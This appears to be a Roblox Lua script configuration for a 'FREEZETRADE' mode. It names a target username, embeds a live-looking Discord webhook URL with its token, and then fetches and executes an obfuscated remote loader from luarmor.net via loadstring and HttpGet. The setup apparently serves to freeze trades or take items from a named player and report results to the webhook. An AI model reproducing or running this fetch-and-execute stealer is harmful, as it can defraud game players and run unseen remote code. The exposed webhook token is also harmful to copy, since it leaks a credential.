-- Mode: FREEZETRADE
getgenv().TARGET_USERNAME = "denji7042"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1566559840585650238/uL2h5wgyBmnkhDfNe3-M2POCNdV3HmYNV6PL0uijJPiVrABI6nVi1hem8Tz4_lT-IJCm"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()
end)